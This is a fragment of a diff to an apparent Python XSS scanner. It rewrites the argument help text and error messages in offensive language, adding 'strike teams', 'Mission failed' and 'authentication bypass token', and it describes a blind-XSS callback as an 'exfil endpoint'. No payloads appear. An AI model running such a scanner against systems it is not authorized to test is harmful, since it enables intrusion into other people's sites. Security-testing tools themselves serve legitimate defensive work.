+    parser.add_argument("--url", required=True, help="Target URL (engagement zone)")
     parser.add_argument("--method", default="GET", choices=["GET", "POST"], help="HTTP method")
-    parser.add_argument("--cookie", default=None, help="Session cookie (e.g., 'PHPSESSID=abc; security=low')")
-    parser.add_argument("--params", default=None, help="Comma-separated parameters (auto-discovers if not set)")
-    parser.add_argument("--threads", type=int, default=5, help="Concurrent threads (default: 5)")
-    parser.add_argument("--depth", type=int, default=1, help="Crawl depth (default: 1)")
-    parser.add_argument("--timeout", type=int, default=15, help="Request timeout in seconds")
-    parser.add_argument("--stored", action="store_true", help="Enable stored XSS detection (2-pass)")
-    parser.add_argument("--dom", action="store_true", help="Enable DOM-based XSS analysis")
-    parser.add_argument("--blind", default=None, help="Blind XSS callback URL (e.g., https://your-webhook.io/xss)")
-    parser.add_argument("--headless", action="store_true", help="Use headless browser for execution verification (requires playwright)")
+    parser.add_argument("--cookie", default=None, help="Session cookie (authentication bypass token)")
+    parser.add_argument("--params", default=None, help="Comma-separated parameters (auto-discovers if omitted)")
+    parser.add_argument("--threads", type=int, default=5, help="Concurrent strike teams (default: 5)")
+    parser.add_argument("--depth", type=int, default=1, help="Recon penetration depth (default: 1)")
+    parser.add_argument("--timeout", type=int, default=15, help="Operation timeout in seconds")
+    parser.add_argument("--stored", action="store_true", help="Enable stored XSS sweep (2-pass)")
+    parser.add_argument("--dom", action="store_true", help="Enable DOM XSS analysis")
+    parser.add_argument("--blind", default=None, help="Blind XSS callback (exfil endpoint)")
+    parser.add_argument("--headless", action="store_true", help="Browser-based execution verification (requires playwright)")
 
     args = parser.parse_args()
 
@@ -820,8 +786,8 @@ if __name__ == "__main__":
         scanner.run()
         sys.exit(0 if not scanner.vulnerable else 1)
     except KeyboardInterrupt:
-        print(f"\n{Colors.YELLOW}[!] Scan interrupted by user{Colors.NC}")
+        print(f"\n{Colors.YELLOW}[ ABORT ] Operation interrupted by operator{Colors.NC}")
         sys.exit(130)
     except Exception as e:
-        print(f"\n{Colors.RED}[!] Fatal error: {e}{Colors.NC}")
+        print(f"\n{Colors.RED}[ ERROR ] Mission failed: {e}{Colors.NC}")
         sys.exit(1)
